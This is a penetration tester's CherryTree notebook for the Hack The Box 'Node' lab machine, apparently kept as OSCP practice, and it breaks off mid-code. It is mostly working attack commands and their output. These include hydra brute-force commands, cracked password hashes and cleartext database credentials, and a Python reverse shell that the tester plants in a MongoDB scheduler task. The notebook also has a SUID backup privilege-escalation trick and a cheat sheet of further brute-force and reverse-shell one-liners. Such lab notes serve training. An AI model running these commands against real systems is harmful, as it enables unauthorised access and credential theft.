<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <bookmarks list=""/>
  <node name="10.10.10.58" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1675519371">
    <rich_text>IP :10.10.10.58
Hostname:
OS:





Linux Proof: </rich_text>
    <rich_text family="monospace">cat proof.txt &amp;&amp; hostname &amp;&amp; id &amp;&amp; whoami &amp;&amp; /sbin/ifconfig</rich_text>
    <rich_text>
Windows Proof: </rich_text>
    <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type proof.txt &amp;&amp; ipconfig /all</rich_text>
    <rich_text>
</rich_text>
    <node name="Log Book" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="20" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1709328954">
      <node name="Nmap" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702929818" ts_lastsave="1702930751">
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="0" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> nmap -Pn -sT -p0-65535 --min-rate=1000 -T4 10.10.10.58 -o HTB/Node/nmap/nmap_allTCP.log
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-18 15:00 EST
Nmap scan report for 10.10.10.58 (10.10.10.58)
Host is up (0.15s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 131.49 seconds
</codebox>
        <codebox char_offset="3" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">                                                                                                                                                              
 Writeups  nmap -p 3000 -Pn -A -sC -sV 10.10.10.58
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-18 15:04 EST
Nmap scan report for 10.10.10.58 (10.10.10.58)
Host is up (0.21s latency).

PORT     STATE SERVICE            VERSION
3000/tcp open  hadoop-tasktracker Apache Hadoop
|_http-title: MyPlace
| hadoop-tasktracker-info: 
|_  Logs: /login
| hadoop-datanode-info: 
|_  Logs: /login

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.56 seconds</codebox>
      </node>
      <node name="port3000" unique_id="107" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702929962" ts_lastsave="1709325826">
        <rich_text justification="left"></rich_text>
        <rich_text>


on checking source and visiting </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

we see the following:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


we also find the following js files on viewing page source of </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



on visiting </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

we see:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


if we visit this link 

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
we get
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


if we visit </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
we get


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



then use hydra to bruteforce it

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

this didnt work and i realised its sending another request  so i updated it with the finall error:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

that also didnt work so
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


that also didnt work so i used crack station for admin and got this

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

so the creds are

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


use these credentials to login and we see a backup button so download it.
we see its a base64 encoded string with binaries so lets save it to a file using




by running simple tooling on binary we see its a zip file




after converting and trying to unzip the binary asks for password

</rich_text>
        <codebox char_offset="0" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> gobuster dir -e -u http://10.10.10.58:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster.log --exclude-length 3861
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.58:3000
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          3861
[+] User Agent:              gobuster/3.6
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.10.58:3000/uploads              (Status: 301) [Size: 173] [--&gt; /uploads/]
http://10.10.10.58:3000/assets               (Status: 301) [Size: 171] [--&gt; /assets/]
http://10.10.10.58:3000/vendor               (Status: 301) [Size: 171] [--&gt; /vendor/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
                                                                      </codebox>
        <codebox char_offset="36" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">view-source:http://10.10.10.58:3000/assets/js/app/app.js</codebox>
        <codebox char_offset="62" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">var controllers = angular.module('controllers', []);
var app = angular.module('myplace', [ 'ngRoute', 'controllers' ]);

app.config(function ($routeProvider, $locationProvider) {
  $routeProvider.
    when('/', {
      templateUrl: '/partials/home.html',
      controller: 'HomeCtrl'
    }).
    when('/profiles/:username', {
      templateUrl: '/partials/profile.html',
      controller: 'ProfileCtrl'
    }).
    when('/login', {
      templateUrl: '/partials/login.html',
      controller: 'LoginCtrl'
    }).
    when('/admin', {
      templateUrl: '/partials/admin.html',
      controller: 'AdminCtrl'
    }).
    otherwise({
      redirectTo: '/'
    });

    $locationProvider.html5Mode(true);
});
</codebox>
        <codebox char_offset="128" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">view-source:http://10.10.10.58:3000/profiles/</codebox>
        <codebox char_offset="132" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
	&lt;/body&gt;

	&lt;script type="text/javascript" src="vendor/jquery/jquery.min.js"&gt;&lt;/script&gt;
	&lt;script type="text/javascript" src="vendor/bootstrap/js/bootstrap.min.js"&gt;&lt;/script&gt;
	&lt;script type="text/javascript" src="vendor/angular/angular.min.js"&gt;&lt;/script&gt;
	&lt;script type="text/javascript" src="vendor/angular/angular-route.min.js"&gt;&lt;/script&gt;
	&lt;script type="text/javascript" src="assets/js/app/app.js"&gt;&lt;/script&gt;
	&lt;script type="text/javascript" src="assets/js/app/controllers/home.js"&gt;&lt;/script&gt;
	&lt;script type="text/javascript" src="assets/js/app/controllers/login.js"&gt;&lt;/script&gt;
	&lt;script type="text/javascript" src="assets/js/app/controllers/admin.js"&gt;&lt;/script&gt;
	&lt;script type="text/javascript" src="assets/js/app/controllers/profile.js"&gt;&lt;/script&gt;
	&lt;script type="text/javascript" src="assets/js/misc/freelancer.min.js"&gt;&lt;/script&gt;</codebox>
        <codebox char_offset="149" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">view-source:http://10.10.10.58:3000/assets/js/app/controllers/home.js</codebox>
        <codebox char_offset="161" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">var controllers = angular.module('controllers');

controllers.controller('HomeCtrl', function ($scope, $http) {
  $http.get('/api/users/latest').then(function (res) {
    $scope.users = res.data;
  });
});
</codebox>
        <codebox char_offset="189" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">GET /api/users/latest HTTP/1.1&#13;
Host: 10.10.10.58:3000&#13;
Cache-Control: max-age=0&#13;
Upgrade-Insecure-Requests: 1&#13;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36&#13;
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#13;
Accept-Encoding: gzip, deflate, br&#13;
Accept-Language: en-US,en;q=0.9&#13;
Connection: close&#13;
&#13;
</codebox>
        <codebox char_offset="198" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">HTTP/1.1 200 OK&#13;
X-Powered-By: Express&#13;
Content-Type: application/json; charset=utf-8&#13;
Content-Length: 449&#13;
ETag: W/"1c1-uNG6P2Gk3GDSM3qIsuNDtGcTJkk"&#13;
Date: Thu, 22 Feb 2024 20:59:22 GMT&#13;
Connection: close&#13;
&#13;
[{"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false},{"_id":"59a7368e98aa325cc03ee51e","username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false},{"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false}]</codebox>
        <codebox char_offset="214" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">GET /api/users </codebox>
        <codebox char_offset="225" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">[{"_id":"59a7365b98aa325cc03ee51c","username":"myP14ceAdm1nAcc0uNT","password":"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af","is_admin":true},{"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false},{"_id":"59a7368e98aa325cc03ee51e","username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false},{"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false}]</codebox>
        <codebox char_offset="263" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hydra -l myP14ceAdm1nAcc0uNT -P /usr/share/wordlists/rockyou.txt -s 3000 -f 10.10.10.58 http-post-form "/api/session/authenticate:username=^USER^&amp;password=^PASS^:false" -t 15</codebox>
        <codebox char_offset="366" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hydra -l myP14ceAdm1nAcc0uNT -P /usr/share/wordlists/rockyou.txt -s 3000 -f 10.10.10.58 http-post-form "/api/session/authenticate:username=^USER^&amp;password=^PASS^:Authentication failed" -t 64</codebox>
        <codebox char_offset="393" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hydra -l myP14ceAdm1nAcc0uNT -P /usr/share/wordlists/rockyou.txt 10.10.10.58 -s 3000 http-post-form "/api/session/authenticate:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Authentication failed:H=Content-Type\: application/json" -t 64</codebox>
        <codebox char_offset="466" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af	sha256	manchester</codebox>
        <codebox char_offset="487" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">myP14ceAdm1nAcc0uNT	manchester</codebox>
        <codebox char_offset="647" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">base64 -d myplace.backup &gt; binary</codebox>
        <codebox char_offset="710" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">file binary
binary: Zip archive data, at least v1.0 to extract, compression method=store
                                                                                                                                                                           
 Node  exiftool binary
ExifTool Version Number         : 12.76
File Name                       : binary
Directory                       : .
File Size                       : 2.6 MB
File Modification Date/Time     : 2024:03:01 15:31:55-05:00
File Access Date/Time           : 2024:03:01 15:32:18-05:00
File Inode Change Date/Time     : 2024:03:01 15:31:55-05:00
File Permissions                : -rw-r--r--
File Type                       : ZIP
File Type Extension             : zip
MIME Type                       : application/zip
Zip Required Version            : 10
Zip Bit Flag                    : 0
Zip Compression                 : None
Zip Modify Date                 : 2022:08:16 17:08:52
Zip CRC                         : 0x00000000
Zip Compressed Size             : 0
Zip Uncompressed Size           : 0
Zip File Name                   : var/www/myplace/
Warning                         : [minor] Use the Duplicates option to extract tags for all 863 files
</codebox>
        <codebox char_offset="781" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> Node  unzip binary.zip
Archive:  binary.zip
   creating: var/www/myplace/
[binary.zip] var/www/myplace/package-lock.json password: 
</codebox>
      </node>
      <node name="foothold" unique_id="108" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1709325834" ts_lastsave="1709328599">
        <rich_text>i convert the zip file found earlier using zip2john and then bruteforce it

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


so the password is magicword


on unzipping the file we find app.js with the following creds


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


using the creds  and 

we try to ssh


and we are in

we find a process running as tom


on logging in with mongodb via

 we are connected to scheduler


on reading we realise that we can add a task that can be run and give us rev shell so we do it via:

</rich_text>
        <codebox char_offset="76" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">john --wordlist=/usr/share/wordlists/rockyou.txt binzip2john.log
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
magicword        (binary.zip)     
1g 0:00:00:00 DONE (2024-03-01 15:49) 14.28g/s 2633Kp/s 2633Kc/s 2633KC/s berhasil..joan21
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
</codebox>
        <codebox char_offset="175" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&amp;authSource=myplace'</codebox>
        <codebox char_offset="195" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mark</codebox>
        <codebox char_offset="201" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">5AYRft73VtFpc84k</codebox>
        <codebox char_offset="302" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mongo -u mark -p 5AYRft73VtFpc84k scheduler</codebox>
        <codebox char_offset="437" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">db.tasks.insert({cmd: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.12\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"})</codebox>
      </node>
      <node name="privesc" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1709328954" ts_lastsave="1709329994">
        <rich_text>on checking the suid as tom via the command


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



we get the following

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


from app.js file we see that it uses the following


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


and it basically backs up the folder u give it


via trial and error i found out that /root is not working so we do so we bypass it via changing the value

first export HOME via

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


then run the following

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


then base64 decode it and un</rich_text>
        <codebox char_offset="46" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> find / -perm -4000 2&gt;/dev/null                                                                                                                                  
/usr/lib/eject/dmcrypt-get-device                                                                                                                                           
/usr/lib/snapd/snap-confine                                                                                                                                                 
/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                                 
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic                                                                                                                                  
/usr/lib/openssh/ssh-keysign                                                                                                                                                
/usr/lib/policykit-1/polkit-agent-helper-1                                                                                                                                  
/usr/local/bin/backup                                                                                                                                                       
/usr/bin/chfn                                                                                                                                                               
/usr/bin/at                                                                                                                                                                 
/usr/bin/gpasswd                                                                                                                                                            
/usr/bin/newgidmap                                                                                                                                                          
/usr/bin/chsh                                                                                                                                                               
/usr/bin/sudo                                                                                                                                                               
/usr/bin/pkexec                                                                                                                                                             
/usr/bin/newgrp                                                                                                                                                             
/usr/bin/passwd                                                                                                                                                             
/usr/bin/newuidmap                                                                                                                                                          
/bin/ping                                                                                                                                                                   
/bin/umount                                                                                                                                                                 
/bin/fusermount                                                                                                                                                             
/bin/ping6                                                                                                                                                                  
/bin/ntfs-3g                                                                                                                                                                
/bin/su                                                                                                                                                                     
/bin/mount          </codebox>
        <codebox char_offset="73" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">/usr/local/bin/backup </codebox>
        <codebox char_offset="130" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp</codebox>
        <codebox char_offset="313" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">export HOME=/root</codebox>
        <codebox char_offset="341" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "~" &gt; /tmp/temp</codebox>
      </node>
    </node>
    <node name="Exploitation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474629">
      <rich_text weight="heavy">Service Exploited:  
Vulnerability Type:
Exploit POC:</rich_text>
      <rich_text>
</rich_text>
      <rich_text weight="heavy">Description</rich_text>
      <rich_text>: 



</rich_text>
      <rich_text underline="single" weight="heavy">Discovery of Vulnerability</rich_text>
      <rich_text>






</rich_text>
      <rich_text underline="single" weight="heavy">Exploit Code Used</rich_text>
      <rich_text>







</rich_text>
      <rich_text underline="single" weight="heavy">Proof\Local.txt File</rich_text>
      <rich_text>

   ☐ Screenshot with ifconfig\ipconfig
   ☐ Submit too OSCP Exam Panel






</rich_text>
    </node>
    <node name="Priv Escalation" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1500474606">
      <rich_text weight="heavy">Service Exploited:  
Vulnerability Type:
Exploit POC:</rich_text>
      <rich_text>
</rich_text>
      <rich_text weight="heavy">Description</rich_text>
      <rich_text>: 

</rich_text>
      <rich_text underline="single" weight="heavy">Discovery of Vulnerability</rich_text>
      <rich_text>






</rich_text>
      <rich_text underline="single" weight="heavy">Exploit Code Used</rich_text>
      <rich_text>







</rich_text>
      <rich_text underline="single" weight="heavy">Proof\Local.txt File</rich_text>
      <rich_text>

   ☐ Screenshot with ifconfig\ipconfig
   ☐ Submit too OSCP Exam Panel

</rich_text>
    </node>
    <node name="Goodies" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="43" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1684267948">
      <node name="Hashes" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1492949998"/>
      <node name="Passwords" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1492950150"/>
      <node name="Proof\Flags\Other" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1709328836">
        <rich_text>
Linux Proof: </rich_text>
        <rich_text family="monospace">cat proof.txt &amp;&amp; hostname &amp;&amp; id &amp;&amp; whoami &amp;&amp; /sbin/ifconfig</rich_text>
        <rich_text>
Windows Proof: </rich_text>
        <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type proof.txt &amp;&amp; ipconfig /all</rich_text>
        <rich_text>


User:








Root

</rich_text>
        <codebox char_offset="179" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cat user.txt &amp;&amp; hostname &amp;&amp; id &amp;&amp; whoami &amp;&amp; /sbin/ifconfig</codebox>
        <encoded_png char_offset="182" justification="left" link=""></encoded_png>
        <codebox char_offset="193" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cat root.txt &amp;&amp; hostname &amp;&amp; id &amp;&amp; whoami &amp;&amp; /sbin/ifconfig</codebox>
      </node>
    </node>
    <node name="Methodology" unique_id="29" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684267948" ts_lastsave="1701300242">
      <rich_text>
☐ </rich_text>
      <rich_text link="node 36">nmap</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 103">DNS</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 31">gobuster</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 33">nikto</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 37">FTP</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 34">smb</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 35">Active Directory</rich_text>
      <rich_text> 
☐ </rich_text>
      <rich_text link="node 32">ssh</rich_text>
      <rich_text>
☐ </rich_text>
      <rich_text link="node 42">PrivEsc</rich_text>
      <node name="Brute Force" unique_id="57" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690629" ts_lastsave="1687690684">
        <rich_text> </rich_text>
        <node name="Hydra" unique_id="58" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690629" ts_lastsave="1689800025">
          <rich_text underline="single" scale="h1">Hydra</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">HTTP Basic Authentication</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f 10.10.10.58 http-get /phpmyadmin/ -t 15</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">HTTP Get Request</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">hydra 10.10.10.58 -V -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/rockyou.txt http-get-form "/login/:username=^USER^&amp;password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t 15</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">HTTP Post Request</rich_text>
          <rich_text>
Check request in BURP to see Post parameters. -l or -L has to be set, even if there is no user to login with!. Use </rich_text>
          <rich_text family="monospace">https-post-form</rich_text>
          <rich_text> instead of </rich_text>
          <rich_text family="monospace">http-post-form</rich_text>
          <rich_text> for HTTPS sites.

</rich_text>
          <rich_text family="monospace">hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.58 http-post-form "/webapp/login.php:username=^USER^&amp;password=^PASS^:Invalid" -t 15</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">MYSQL</rich_text>
          <rich_text>
Change MYDATABASENAME. Default databasename is mysql.

</rich_text>
          <rich_text family="monospace">hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -vv  mysql://10.10.10.58:3306/MYDATABASENAME -t 15</rich_text>
          <rich_text>

___________________________________</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>____


SSH



or if that d</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>oesnt work

</rich_text>
          <codebox char_offset="1091" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.58</codebox>
          <codebox char_offset="1118" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ssh 10.10.10.58 -u patrick -p /usr/share/wordlists/rockyou.txt
</codebox>
        </node>
      </node>
      <node name="Shells" unique_id="59" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1701626719">
        <rich_text>

☐ </rich_text>
        <rich_text link="webs https://www.revshells.com/">https://www.revshells.com/</rich_text>
        <rich_text>
☐ moz-extension://c8e8314e-8d2e-4f3a-9b40-37d10c56988b/index.html </rich_text>
        <node name="Catching Reverse Shells (Nc)" unique_id="62" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">Catching Reverse Shells (Netcat)</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

rlwrap enables the usage of arrow keys in your shell. </rich_text>
          <rich_text link="webs https://github.com/hanslub42/rlwrap">https://github.com/hanslub42/rlwrap</rich_text>
          <rich_text>

</rich_text>
          <rich_text family="monospace">rlwrap nc -nlvp 4444</rich_text>
        </node>
        <node name="Python" unique_id="67" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690684" ts_lastsave="1687690684">
          <rich_text underline="single" scale="h1">Python</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Reverse Shell</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single">As Command:</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</rich_text>
          <rich_text>

</rich_text>
          <rich_text underline="single">Python Code:</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace" foreground="#d73a49">import</rich_text>
          <rich_text family="monospace"> socket,subprocess,os
s</rich_text>
          <rich_text family="monospace" foreground="#005cc5">=</rich_text>
          <rich_text family="monospace">socket.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">socket</rich_text>
          <rich_text family="monospace">(socket.</rich_text>
          <rich_text family="monospace" foreground="#e36209">AF_INET</rich_text>
          <rich_text family="monospace">,socket.</rich_text>
          <rich_text family="monospace" foreground="#e36209">SOCK_STREAM</rich_text>
          <rich_text family="monospace">)
s.</rich_text>
          <rich_text family="monospace" foreground="#6f42c1">connect</rich_text>
          <rich_text family="monospace">(("192.168.0.1",</rich_text>
